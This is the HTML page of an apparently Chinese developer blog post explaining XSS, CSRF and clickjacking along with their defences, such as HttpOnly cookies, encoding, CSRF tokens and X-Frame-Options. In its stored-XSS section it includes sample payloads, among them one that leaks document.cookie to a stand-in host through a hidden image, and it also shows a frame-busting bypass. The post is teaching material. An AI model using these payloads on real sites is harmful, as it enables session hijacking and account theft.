@@ -1,0 +1,501 @@
+
+
+
+
+
+
+
+<!doctype html>
+<html lang="zh_CN">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta http-equiv="Content-Type" content="text/html" charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  
+  <meta name="author" content="Edward">
+  
+  
+  
+  
+    <meta name="description" content="XSS
+xss: 跨站脚本攻击（Cross Site Scripting）是最常见和基本的攻击 WEB 网站方法，攻击者通过注入非法的 html 标签或者 javascript 代码，从而当用户浏览该网页时，控制用户浏览器。
+
+xss主要分为三类
+DOM xss :DOM即文本对象模型，DOM通常代表在html、xhtml和xml中的对象，使用DOM可以允许程序和脚本动态的访问和更新文档的内...">
+  
+  <title>前端安全 [ Edward Blog! ]</title>
+  
+    <link rel="alternate" href="/atom.xml" title="Edward Blog!">
+  
+  
+    <link rel="shortcut icon" href="/favicon.ico">
+  
+  
+  <link rel="stylesheet" href="/css/random.css">
+<link rel="stylesheet" href="/css/vegas.min.css">
+<link rel="stylesheet" href="/css/highlight-railscasts.css">
+<link rel="stylesheet" href="/css/jquery.fancybox.css">
+<link rel="stylesheet" href="/css/iconfont/iconfont.css">
+<link rel="stylesheet" href="/css/jquery.fancybox-thumbs.css">
+<link rel="stylesheet" href="/css/plyr.css">
+  
+</head>
+
+<body>
+<div class="side-navigate hide-area">
+  
+    <div class="item prev">
+      <a href="/2018/07/31/reflow与repaint/">
+        <div class="item-icon"></div>
+      </a>
+      <div class="item-title">
+        reflow与repaint
+      </div>
+    </div>
+  
+  
+    <div class="item next">
+      <a href="/2018/07/30/Web前端中的安全问题/">
+        <div class="item-icon"></div>
+      </a>
+      <div class="item-title">
+        Web前端中的安全问题
+      </div>
+    </div>
+  
+</div>
+<div id="outer-container" class="hide-area">
+<div id="container">
+  <div id="menu-outer" class="slide-down">
+    <div id="menu-inner">
+      <div id="brand">
+        
+        <a onclick="openUserCard()">
+          <img id="avatar" src="https://images.unsplash.com/photo-1491743715344-d5eed2a9c5bd?ixlib=rb-0.3.5&ixid=eyJhcHBfaWQiOjEyMDd9&s=39f2860d4712e5cfdceeaea7b6dcb338&auto=format&fit=crop&w=634&q=80">
+          <div id="homelink">Edward Blog!</div>
+        </a>
+      </div>
+      <div id="menu-list">
+        <ul>
+        
+        
+          
+            <li>
+          
+            <a href="/index.html">首页</a>
+            
+          </li>
+        
+          
+            <li>
+          
+            <a href="/archives">文章</a>
+            
+          </li>
+        
+          
+            <li>
+          
+            <a href="/tags">标签</a>
+            
+          </li>
+        
+          
+            <li>
+          
+            <a href="/categories">分类</a>
+            
+          </li>
+        
+          
+            <li>
+          
+            <a href="/about">关于</a>
+            
+          </li>
+        
+          
+            <li>
+          
+            <a href="https://github.com/edward-egg">Github</a>
+            
+          </li>
+        
+        </ul>
+      </div>
+      <div id="show-menu">
+        <button>Menu</button>
+      </div>
+    </div>
+  </div>
+
+  <div id="content-outer">
+    <div id="content-inner">
+      
+      
+  <article id="post">
+    <h1>前端安全</h1>
+    <p class="page-title-sub">
+      <span id="post-title-date">Created at 2018-07-31</span>
+      
+        <span id="post-title-updated">Updated at 2019-11-24</span>
+      
+      
+      <span id="post-title-categories">Category
+      
+      
+        
+        
+        <a href="/categories/Web/">Web</a>
+      
+      </span>
+      
+      
+      <span id="post-title-tags">
+      Tag
+      
+      
+        
+        
+        <a href="/tags/HTML/">HTML</a>
+      
+      </span>
+      
+    </p>
+    
+    <h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><ul>
+<li>xss: 跨站脚本攻击（Cross Site Scripting）是最常见和基本的攻击 WEB 网站方法，攻击者通过注入非法的 html 标签或者 javascript 代码，从而当用户浏览该网页时，控制用户浏览器。</li>
+</ul>
+<h3 id="xss主要分为三类"><a href="#xss主要分为三类" class="headerlink" title="xss主要分为三类"></a>xss主要分为三类</h3><ol>
+<li>DOM xss :<br>DOM即文本对象模型，DOM通常代表在html、xhtml和xml中的对象，使用DOM可以允许程序和脚本动态的访问和更新文档的内容、结构和样式。它不需要服务器解析响应的直接参与，触发XSS靠的是浏览器端的DOM解析，可以认为完全是客户端的事情。</li>
+<li>反射型 xss :<br>反射型XSS也被称为非持久性XSS，是现在最容易出现的一种XSS漏洞。发出请求时，XSS代码出现在URL中，最后输入提交到服务器，服务器解析后在响应内容中出现这段XSS代码，最后浏览器解析执行。</li>
+<li>存储型 xss :<br>存储型XSS又被称为持久性XSS，它是最危险的一种跨站脚本，相比反射型XSS和DOM型XSS具有更高的隐蔽性，所以危害更大，因为它不需要用户手动触发。 允许用户存储数据的web程序都可能存在存储型XSS漏洞，当攻击者提交一段XSS代码后，被服务器端接收并存储，当所有浏览者访问某个页面时都会被XSS，其中最典型的例子就是留言板。</li>
+</ol>
+<h3 id="跨站脚本共计可能造成以下影响："><a href="#跨站脚本共计可能造成以下影响：" class="headerlink" title="跨站脚本共计可能造成以下影响："></a>跨站脚本共计可能造成以下影响：</h3><ol>
+<li>利用虚假输入表单边去用户个人信息。</li>
+<li>利用脚本窃取用户的Cookie值，被害人在不知情的情况下，帮助攻击者发送恶意请求。</li>
+<li>显示伪造的文章或图片。</li>
+</ol>
+<h3 id="存储型xss案例"><a href="#存储型xss案例" class="headerlink" title="存储型xss案例"></a>存储型xss案例</h3><p>在项目开发中，评论是个常见的功能，如果直接把评论的内容保存到数据库，那么显示的时候就可能被攻击。</p>
+<p>如果你只是想试试 xss，可以这样：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;font size=<span class="hljs-string">"100"</span> color=<span class="hljs-string">"red"</span>&gt;试试水&lt;/font&gt;<br></code></pre></td></tr></table></figure></p>
+<p>或这样：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;script&gt;<br>    <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) &#123;<br>        alert(<span class="hljs-string">'Hello'</span>)<br>    &#125;<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure></p>
+<p>最常见xss攻击是读取Cookie：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;script&gt;<br>    alert(document.cookie)<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure></p>
+<p>Cookie发送给攻击者的站点：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">var img = document.createElement(<span class="hljs-string">'img'</span>)<br>img.src=<span class="hljs-string">'http://www.xss.com?cookie='</span> + document.cookie<br>img.style.display=<span class="hljs-string">'none'</span><br>document.getElementsByTagName(<span class="hljs-string">'body'</span>)[0].appendChild(img)<br></code></pre></td></tr></table></figure></p>
+<p>当前用户的登录凭证存储于服务器的 session 中，而在浏览器中是以 cookie 的形式存储的。如果攻击者能获取到用户登录凭证的 Cookie，甚至可以绕开登录流程，直接设置这个 Cookie 值，来访问用户的账号。</p>
+<h3 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h3><p>按理说，只要有输入数据的地方，就可能存在 XSS 危险。</p>
+<p>httpOnly: 在 cookie 中设置 HttpOnly 属性后，js脚本将无法读取到 cookie 信息。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">// koa<br>ctx.cookies.set(name, value, &#123;<br>    httpOnly: <span class="hljs-literal">true</span> // 默认为 <span class="hljs-literal">true</span><br>&#125;)<br></code></pre></td></tr></table></figure>
+<h3 id="过滤"><a href="#过滤" class="headerlink" title="过滤"></a>过滤</h3><ol>
+<li>输入检查，一般是用于对于输入格式的检查，例如：邮箱，电话号码，用户名，密码……等，按照规定的格式输入。</li>
+<li>不仅仅是前端负责，后端也要做相同的过滤检查。</li>
+<li>因为攻击者完全可以绕过正常的输入流程，直接利用相关接口向服务器发送设置。</li>
+</ol>
+<h3 id="HtmlEncode"><a href="#HtmlEncode" class="headerlink" title="HtmlEncode"></a>HtmlEncode</h3><p>某些情况下，不能对用户数据进行严格过滤，需要对标签进行转换</p>
+<p>当用户输入</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;script&gt;window.location.href=”http://www.baidu.com”;&lt;/script&gt;,<br></code></pre></td></tr></table></figure>
+<p>最终保存结果为：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;script&gt;window.location.href=<span class="hljs-string">"http://www.baidu.com"</span>&lt;/script&gt;<br></code></pre></td></tr></table></figure>
+<p> 在展现时，浏览器会对这些字符转换成文本内容，而不是一段可以执行的代码。</p>
+<h3 id="JacascriptEncode"><a href="#JacascriptEncode" class="headerlink" title="JacascriptEncode"></a>JacascriptEncode</h3><p>对下列字符加上反斜杠<br><img src="http://ovshyp9zv.bkt.clouddn.com/front4.png?imageMogr2/auto-orient/interlace/1/blur/1x0/quality/75%7Cwatermark/2/text/amtjaGFvLmNu/font/5qW35L2T/fontsize/720/fill/I0ZERkRGRA==/dissolve/100/gravity/SouthEast/dx/10/dy/10%7Cimageslim" alt="转义"></p>
+<hr>
+<h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><p>csrf：跨站点请求伪造（Cross-Site Request Forgeries），也被称为 one-click attack 或者 session riding。冒充用户发起请求（在用户不知情的情况下）， 完成一些违背用户意愿的事情（如修改用户信息，删初评论等）。</p>
+<h3 id="可能会造成以下影响"><a href="#可能会造成以下影响" class="headerlink" title="可能会造成以下影响"></a>可能会造成以下影响</h3><ol>
+<li>利用已通过认证的用户权限更新设定信息等；</li>
+<li>利用已通过认证的用户权限购买商品；</li>
+<li>利用已通过的用户权限在留言板上发表言论。</li>
+</ol>
+<p>原理：<br><img src="http://ovshyp9zv.bkt.clouddn.com/front5.png?imageMogr2/auto-orient/interlace/1/blur/1x0/quality/75%7Cwatermark/2/text/amtjaGFvLmNu/font/5qW35L2T/fontsize/720/fill/I0ZERkRGRA==/dissolve/100/gravity/SouthEast/dx/10/dy/10%7Cimageslim" alt="csrf"><br>网站过于相信用户</p>
+<h3 id="与xss的区别"><a href="#与xss的区别" class="headerlink" title="与xss的区别"></a>与xss的区别</h3><ol>
+<li>通常来说 CSRF 是由 XSS 实现的，CSRF 时常也被称为 XSRF（CSRF 实现的方式还可以是直接通过命令行发起请求等）。</li>
+<li>本质上讲，XSS 是代码注入问题，CSRF 是 HTTP 问题。XSS 是内容没有过滤导致浏览器将攻击者的输入当代码执行。CSRF 则是因为浏览器在发送 HTTP 请求时候自动带上 cookie，而一般网站的 session 都存在 cookie里面。</li>
+</ol>
+<h3 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h3><ol>
+<li>比如某网站的转账操作</li>
+<li>受害者张三给李四转账100，</li>
+<li>通过对银行的网站发起请求 <a href="http://bank.example/transfer?accout=张三&amp;a.." target="_blank" rel="noopener">http://bank.example/transfer?accout=张三&amp;a..</a>. ，</li>
+<li>通常情况下，该请求发出后，服务器端会检查 session 是否合法，并且张三已经登录成功，</li>
+<li>黑客王五可以自己给银行发送一个请求 <a href="http://bank.example/transfer?accout=张三&amp;a.." target="_blank" rel="noopener">http://bank.example/transfer?accout=张三&amp;a..</a>. ，但是这个请求来自王五，而不是张三，他并不能通过安全认证。他需要张三的 session 。</li>
+<li>王五自己做了一个网站，放入如下代码 <a href="http://bank.example/transfer?accout=张三&amp;a.." target="_blank" rel="noopener">http://bank.example/transfer?accout=张三&amp;a..</a>. ，</li>
+<li>用各种方式诱使张三点击自己的网站。</li>
+<li>张三登录了银行的网站没有退出，访问了黑客王五的网站，上述的 url 就会向银行发起请求。</li>
+<li>如果session没有过期，这时悲剧就发生了，张三的账户里少了1000。</li>
+</ol>
+<h3 id="防御-1"><a href="#防御-1" class="headerlink" title="防御"></a>防御</h3><ol>
+<li>验证码；强制用户必须与应用进行交互，才能完成最终请求。此种方式能很好的遏制 csrf，但是用户体验比较差。</li>
+<li>尽量使用 post ，限制 get 使用；上一个例子可见，get 太容易被拿来做 csrf 攻击，但是 post 也并不是万无一失，攻击者只需要构造一个form就可以。</li>
+<li>Referer check；请求来源限制，此种方法成本最低，但是并不能保证 100% 有效，因为服务器并不是什么时候都能取到 Referer，而且低版本的浏览器存在伪造 Referer 的风险。</li>
+<li>token；token 验证的 CSRF 防御机制是公认最合适的方案。</li>
+</ol>
+<ul>
+<li>整体思路如下：</li>
+</ul>
+<ol>
+<li>第一步：后端随机产生一个 token，把这个token 保存到 session 状态中；同时后端把这个token 交给前端页面；</li>
+<li>第二步：前端页面提交请求时，把 token 加入到请求数据或者头信息中，一起传给后端；</li>
+<li>后端验证前端传来的 token 与 session 是否一致，一致则合法，否则是非法请求。</li>
+<li>若网站同时存在 XSS 漏洞的时候，这个方法也是空谈。</li>
+</ol>
+<hr>
+<h2 id="Clickjacking"><a href="#Clickjacking" class="headerlink" title="Clickjacking"></a>Clickjacking</h2><p>Clickjacking： 点击劫持，是指利用透明的按钮或连接做成陷阱，覆盖在 Web 页面之上。然后诱使用户在不知情的情况下，点击那个连接访问内容的一种攻击手段。这种行为又称为界面伪装(UI Redressing) 。</p>
+<h3 id="大概有两种方式："><a href="#大概有两种方式：" class="headerlink" title="大概有两种方式："></a>大概有两种方式：</h3><ol>
+<li>攻击者使用一个透明 iframe，覆盖在一个网页上，然后诱使用户在该页面上进行操作，此时用户将在不知情的情况下点击透明的 iframe 页面；</li>
+<li>攻击者使用一张图片覆盖在网页，遮挡网页原有的位置含义。</li>
+</ol>
+<h3 id="案例-1"><a href="#案例-1" class="headerlink" title="案例"></a>案例</h3><p><img src="http://ovshyp9zv.bkt.clouddn.com/front7.png?imageMogr2/auto-orient/interlace/1/blur/1x0/quality/75%7Cwatermark/2/text/amtjaGFvLmNu/font/5qW35L2T/fontsize/720/fill/I0ZERkRGRA==/dissolve/100/gravity/SouthEast/dx/10/dy/10%7Cimageslim" alt="原理"></p>
+<h3 id="一般步骤"><a href="#一般步骤" class="headerlink" title="一般步骤"></a>一般步骤</h3><ol>
+<li>黑客创建一个网页利用 iframe 包含目标网站；</li>
+<li>隐藏目标网站，使用户无法无法察觉到目标网站存在；</li>
+<li>构造网页，诱变用户点击特点按钮</li>
+<li>用户在不知情的情况下点击按钮，触发执行恶意网页的命令。</li>
+</ol>
+<h3 id="防御-2"><a href="#防御-2" class="headerlink" title="防御"></a>防御</h3><ul>
+<li><p>X-FRAME-OPTIONS<br>X-FRAME-OPTIONS HTTP 响应头是用来给浏览器指示允许一个页面可否在&lt;frame>, &lt;iframe> 或者 &lt;object> 中展现的标记。网站可以使用此功能，来确保自己网站内容没有被嵌到别人的网站中去，也从而避免点击劫持的攻击。</p>
+</li>
+<li><p>有三个值</p>
+</li>
+</ul>
+<ol>
+<li>DENY：表示页面不允许在 frame 中展示，即便是在相同域名的页面中嵌套也不允许。</li>
+<li>SAMEORIGIN：表示该页面可以在相同域名页面的 frame 中展示。</li>
+<li>ALLOW-FROM url：表示该页面可以在指定来源的 frame 中展示。</li>
+</ol>
+<ul>
+<li>配置X-FRAME-OPTIONS</li>
+</ul>
+<ol>
+<li><p>Apache<br>把下面添加到’site’配置中</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Header always append X-Frame-Options SAMEORIGIN<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>Nginx<br>把下面这行添加到 ‘http’, ‘server’ 或者 ‘location’，配置中</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;code class=<span class="hljs-string">"language-javascript"</span>&gt;add_header X-Frame-Options SAMEORIGIN;&lt;/code&gt;<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>IIS<br>添加下面配置到 Web.config 文件中</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">  &lt;system.webServer&gt;<br>...<br>&lt;httpProtocol&gt;<br>  &lt;customHeaders&gt;<br>    &lt;add name=<span class="hljs-string">"X-Frame-Options"</span> value=<span class="hljs-string">"SAMEORIGIN"</span> /&gt;<br>  &lt;/customHeaders&gt;<br>&lt;/httpProtocol&gt;<br>...<br>&lt;/system.webServer&gt;<br></code></pre></td></tr></table></figure>
+</li>
+</ol>
+<ul>
+<li>js 判断顶层窗口跳转，可轻易破解，意义不大；<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">locationTop</span></span>()&#123;<br>  <span class="hljs-keyword">if</span> (top.location != self.location) &#123;<br>     top.location = self.location; <span class="hljs-built_in">return</span> <span class="hljs-literal">false</span>;<br>  &#125;<br>  <span class="hljs-built_in">return</span> <span class="hljs-literal">true</span>; <br> &#125;<br>locationTop();<br>// 破解：<br>// 顶层窗口中放入代码<br>var location = document.location;<br>//或者<br>var location = <span class="hljs-string">""</span>;<br></code></pre></td></tr></table></figure>
+</li>
+</ul>
+
+  </article>
+  <div class="random-toc-area">
+  <button class="btn-hide-toc btn-hide-toc-show" style="display: none" onclick="TOCToggle()">Show TOC</button>
+  <button class="btn-hide-toc btn-hide-toc-hide" onclick="TOCToggle()">Hide TOC</button>
+  <div class="random-toc">
+    <h2>Table of Content</h2>
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS"><span class="toc-text">XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#xss主要分为三类"><span class="toc-text">xss主要分为三类</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#跨站脚本共计可能造成以下影响："><span class="toc-text">跨站脚本共计可能造成以下影响：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#存储型xss案例"><span class="toc-text">存储型xss案例</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#防御"><span class="toc-text">防御</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#过滤"><span class="toc-text">过滤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HtmlEncode"><span class="toc-text">HtmlEncode</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JacascriptEncode"><span class="toc-text">JacascriptEncode</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CSRF"><span class="toc-text">CSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#可能会造成以下影响"><span class="toc-text">可能会造成以下影响</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#与xss的区别"><span class="toc-text">与xss的区别</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#案例"><span class="toc-text">案例</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#防御-1"><span class="toc-text">防御</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Clickjacking"><span class="toc-text">Clickjacking</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#大概有两种方式："><span class="toc-text">大概有两种方式：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#案例-1"><span class="toc-text">案例</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#一般步骤"><span class="toc-text">一般步骤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#防御-2"><span class="toc-text">防御</span></a></li></ol></li></ol>
+  </div>
+</div>
+
+  
+<nav id="pagination">
+  
+    <a href="/2018/07/31/reflow与repaint/" class="prev">&larr; Prev post reflow与repaint</a>
+  
+
+  
+
+  
+    <a href="/2018/07/30/Web前端中的安全问题/" class="next">Next post Web前端中的安全问题 &rarr;</a>
+  
+</nav>
+
+  <!-- JiaThis Button BEGIN -->
+
+<!-- JiaThis Button END -->
+
+
+      
+      
+    </div>
+  </div>
+
+  <div id="bottom-outer">
+    <div id="bottom-inner">
+      Site by Edward using
+      <a href="http://hexo.io">Hexo</a> & <a href="https://github.com/stiekel/hexo-theme-random">Random</a>
+      <br>
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+
+<div id="user-card">
+  <div class="center-field">
+    <img class="avatar" src="https://images.unsplash.com/photo-1491743715344-d5eed2a9c5bd?ixlib=rb-0.3.5&ixid=eyJhcHBfaWQiOjEyMDd9&s=39f2860d4712e5cfdceeaea7b6dcb338&auto=format&fit=crop&w=634&q=80">
+    <p id="description"></p>
+    <ul class="social-icon">
+  
+  
+    <li>
+      <a href="https://github.com/edward-egg">
+        
+          <i class="icon iconfont github">&#xe606;</i>
+        
+      </a>
+    </li>
+  
+    <li>
+      <a href="https://cn.vuejs.org/v2/guide/">
+        
+          VUE
+        
+      </a>
+    </li>
+  
+    <li>
+      <a href="https://www.angular.cn/">
+        
+          Angular
+        
+      </a>
+    </li>
+  
+    <li>
+      <a href="https://doc.react-china.org/">
+        
+          React
+        
+      </a>
+    </li>
+  
+    <li>
+      <a href="https://www.npmjs.com/">
+        
+          NPM
+        
+      </a>
+    </li>
+  
+    <li>
+      <a href="https://www.webpackjs.com/">
+        
+          Webpack
+        
+      </a>
+    </li>
+  
+    <li>
+      <a href="https://www.csdn.net/">
+        
+          CSDN
+        
+      </a>
+    </li>
+  
+</ul>
+  </div>
+</div>
+
+
+<div id="btn-view">Hide</div>
+
+<script>
+// is trigger analytics / tongji script
+var isIgnoreHost = false;
+
+if(window && window.location && window.location.host) {
+  isIgnoreHost = ["localhost","127.0.0.1"].some(function(address){
+    return 0 === window.location.host.indexOf(address);
+  });
+}
+
+var isTriggerAnalytics = !( true && isIgnoreHost );
+
+</script>
+
+
+
+
+  
+  
+    <script src="/js/jquery-2.2.3.min.js"></script>
+  
+    <script src="/js/vegas.min.js"></script>
+  
+    <script src="/js/random.js"></script>
+  
+    <script src="/js/highlight.pack.js"></script>
+  
+    <script src="/js/jquery.mousewheel.pack.js"></script>
+  
+    <script src="/js/jquery.fancybox.pack.js"></script>
+  
+    <script src="/js/jquery.fancybox-thumbs.js"></script>
+  
+    <script src="/js/plyr.js"></script>
+  
+
+<script>
+
+  // fancybox
+  var backgroundImages = [];
+  
+  $('#post').each(function(i){
+    $(this).find('img').each(function(){
+      if ($(this).parent().hasClass('fancybox') || $(this).parent().hasClass('fancybox-thumb')) return;
+      var alt = this.alt || this.title;
+      if (alt) $(this).after('<span class="caption">' + alt + '</span>');
+      $(this).wrap('<a href="' + this.src + '" title="' + alt + '" class="fancybox"></a>');
+    });
+    $(this).find('.fancybox').each(function(){
+      $(this).attr('rel', 'post' + i);
+    });
+  });
+  $(".fancybox").fancybox();
+
+var vegasConfig = {"animation":"random","preload­Image":true,"transition":["slideLeft2","slideRight2","flash2"],"timer":true,"delay":5000,"shuffle":true,"count":28};
+var unsplashConfig = {"gravity":"north"};
+// is show background images
+var turnoffBackgroundImage = false;
+
+
+
+  turnoffBackgroundImage = true;
+
+
+var backgroundColor = "34495E";
+
+$(".fancybox-thumb").fancybox({
+  prevEffect: 'none',
+  nextEffect: 'none',
+  helpers: {
+    title: {
+      type: 'outside'
+    },
+    thumbs: {
+      width: 50,
+      height: 50
+    }
+  }
+});
+
+// show video with plyr
+$(".video-container iframe").each(function(i){
+  var url = $(this).attr('src');
+  var id = url.split('/').pop();
+  var plyrContainer = document.createElement('div');
+  plyrContainer.className = 'plyr';
+  var plyrElement = document.createElement('div');
+  plyrElement.dataset.videoId = id;
+  switch(true) {
+    case url.search('youtube.com') >= 0:
+      plyrElement.dataset.type = 'youtube';
+      break;
+    case url.search('vimeo.com') >= 0:
+      plyrElement.dataset.type = 'vimeo';
+      break;
+    default:
+      return;
+  };
+  plyrContainer.appendChild(plyrElement);
+  $(this).parent().html(plyrContainer);
+});
+plyr.setup('.plyr', {iconUrl: '/css/sprite.svg'});
+</script>
+</body>
+</html>
+
